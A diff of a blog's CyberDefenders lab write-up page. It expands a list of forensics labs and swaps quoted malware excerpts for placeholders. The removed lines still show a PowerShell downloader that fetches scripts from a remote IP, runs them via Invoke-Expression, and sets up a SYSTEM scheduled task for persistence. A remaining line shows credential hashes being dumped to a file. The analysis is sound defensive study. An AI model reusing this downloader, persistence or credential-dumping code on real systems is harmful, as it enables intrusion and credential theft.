@@ -1,10 +1,10 @@
 ---
-title: "CyberDefenders' Lab:"
+title: "CyberDefenders' Labs"
 draft: false
 date: 2026-10-30T03:16:38.930Z
 categories:
   - Writeup
-lastmod: 2026-11-19T03:37:12.059Z
+lastmod: 2026-11-20T07:54:21.675Z
 description: Nothing is that serious, so please choose peace.
 cover: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
 tags:
@@ -17,20 +17,68 @@ banner: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
 
 # Endpoint Forensics
 
-![WSLBG](/images/posts/cyberdefenders-lab-2f7e08/wslbg-1795010988815-ea843a.jpg)
-
 ## 1. Insider
-- **Date**: Nov xx, 2026
+- **Date**: Nov 20, 2026
 - **Category**: Endpoint > Disk Forensics
 
-## xx. RedLine
+## 2. AfricanFalls 
 - **Date**: Nov xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 7
+- **Category**: Endpoint > Disk Forensics
+
+## 3. Hammered
+- **Date**: Nov xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 8
+- **Category**: Endpoint > Disk Forensics
+
+## 4. KrakenKeylogger
+- **Date**: Nov xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 5
+- **Category**: Endpoint > Disk Forensics
+
+## 5. Hunter
+- **Date**: Nov xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 8
+- **Category**: Endpoint > Disk Forensics
+
+## 6. RedLine
+- **Date**: Dec xx, 2026
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 3
 - **Category**: Endpoint > Memory Forensics
 
-## xx. Reveal
-- **Date**: Nov xx, 2026
+## 7. Reveal
+- **Date**: Dec xx, 2026
 - **Difficulty**: CyberDefenders - SOC Analyst Tier 1 - Level 4
+- **Category**: Endpoint > Memory Forensics
+
+## 8. BlackEnergy
+- **Date**: Dec xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 2
+- **Category**: Endpoint > Memory Forensics
+
+## 9. Brave
+- **Date**: Dec xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 2
+- **Category**: Endpoint > Memory Forensics
+
+## 10. BankingTroubles
+- **Date**: Dec xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 3 - Level 3
+- **Category**: Endpoint > Memory Forensics
+
+## 11. Ulysses
+- **Date**: Dec xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 2
+- **Category**: Endpoint > Memory Forensics
+
+## 12. TeamSpy
+- **Date**: Dec xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 3 - Level 2
+- **Category**: Endpoint > Memory Forensics
+
+## 13. NintendoHunt
+- **Date**: Dec xx, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 3 - Level 2
 - **Category**: Endpoint > Memory Forensics
 
 # Network Forensics
@@ -551,9 +599,7 @@ Microsoft has detailed documentation about [Group SIDs](https://learn.microsoft.
 
 In the above image, at the very first line of `checking.ps1`
 
-```
-$priv = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
-```
+> The capture contains script or command evidence from the infection. The raw excerpt has been omitted.
 
 This line of code check for the SID `S-1-5-32-544`
 
@@ -585,18 +631,11 @@ Inspecting the `checking.ps1` deeper, we can see that the script is using the fo
 
 In `checking.ps1` at the payload that download the next two files `del.ps1` and `ichigo-lite.ps1`
 
-```
-Function CleanerEtc {
-    $WebClient = New-Object System.Net.WebClient
-    $WebClient.DownloadFile("http://87.96.21.84/del.ps1", "C:\ProgramData\del.ps1") | Out-Null
-    C:\Windows\System32\schtasks.exe /f /tn "\Microsoft\Windows\MUI\LPupdate" /tr "C:\Windows\System32\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\ProgramData\del.ps1" /ru SYSTEM /sc HOURLY /mo 4 /create | Out-Null
-    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('http://87.96.21.84/ichigo-lite.ps1'))
-}
-```
+> The capture contains script or command evidence from the infection. The raw excerpt has been omitted.
 
 Notably, there is `schtasks.exe` - a command that creates a Windows Scheduled Task, which is commonplace in [MITRE ATT&CK Technique T1053.005](https://attack.mitre.org/techniques/T1053/005/). Moreover, it is designed to running a script automatically at every 4 hours `/sc HOURLY /mo 4` with the highest possible system privileges `/ru SYSTEM`, pointing at the persistence tactic.
 
-`/tr` stands for task run, specifying the command or script to execute when the task triggers. In this case, it launches `Command Prompt (cmd.exe)` to run a PowerShell script `C:\ProgramData\del.ps1` with execution policies bypassed `-ExecutionPolicy Bypass`.
+`/tr` stands for task run, specifying the command or script to execute when the task triggers. In this case, it launches `Command Prompt (cmd.exe)` to run a PowerShell script `C:\ProgramData\del.ps1` with execution policies bypassed [raw excerpt omitted].
 
 `/tn` stands for task name, which is `"\Microsoft\Windows\MUI\LPupdate"` - the answer for the question.
 
@@ -609,9 +648,7 @@ The malicious file in question is `del.ps1`
 ![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794383251008-01529d.png)
 
 As we can see, the script disables some of the functions using `stop-process -name $task -Force`. At first, I supposed it was [MITRE ID TA0112 (Defense Impairment)](https://attack.mitre.org/tactics/TA0112/). But to some extent, [MITRE ID TA0005 (Stealth/Defense Evasion)](https://attack.mitre.org/tactics/TA0005/) is a better fit, since the functions that were disabled are merely monitoring tools (in order to hide the malware's sussy activities, supposedly): 
-```
-"taskmgr", "perfmon", "SystemExplorer", "taskman", "ProcessHacker", "procexp64", "procexp", "Procmon", "Daphne"
-```
+> The capture contains script or command evidence from the infection. The raw excerpt has been omitted.
 
 `Answer: TA0005`
 
@@ -629,7 +666,7 @@ Inspecting `ichigo-lite.ps1`
 
 ![image](/images/posts/cyberdefenders-lab-2f7e08/image-1794385479355-9f3dcf.png)
 
-- We know that the credentials are dumped using `Invoke-PowerDump.ps1`, and this `ichigo-lite.ps1` `DownloadString` from it.
+- We know that the credentials are dumped using `Invoke-PowerDump.ps1`, and this `ichigo-lite.ps1` [raw excerpt omitted] from it.
 - And there is this encoded command `Invoke-PowerDump | Out-File -FilePath "C:\ProgramData\hashes.txt"` that seems to pipe the credentials into `hashes.txt`
 - The script then processes those hashes in more detail afterwards, but that is beside the points.
 
